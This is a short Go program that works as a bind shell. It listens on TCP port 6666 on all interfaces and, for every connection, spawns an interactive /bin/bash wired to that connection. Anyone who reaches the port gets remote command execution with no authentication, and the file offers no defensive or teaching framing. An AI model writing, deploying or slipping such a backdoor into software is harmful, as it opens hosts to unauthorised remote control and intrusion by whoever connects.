package main

import (

	"os/exec"
	"net"
	"log"
	"io"
	"fmt"
)






func handelConn(conn net.Conn){
	var (
		cmd *exec.Cmd
	)

	cmd = exec.Command("/bin/bash", "-i")
	r, w := io.Pipe()

	cmd.Stdout = w
	cmd.Stdin = conn

	go io.Copy(conn, r)

	cmd.Run()

	conn.Close()

}



func main(){

	var (
		//cmd *exec.Cmd
		l	net.Listener

	)

	l, err := net.Listen("tcp", "0.0.0.0:6666")
	if err != nil {
		log.Println(">>>", err)
		return 
	}

	defer l.Close()
	fmt.Println("listening on port 6666")
	for {
		conn, err := l.Accept() 


		log.Println(err, conn)
		if err != nil {
			continue
		}


		go handelConn(conn)
	}


//	cmd = exec.Command("/bin/bash", "-i")





}
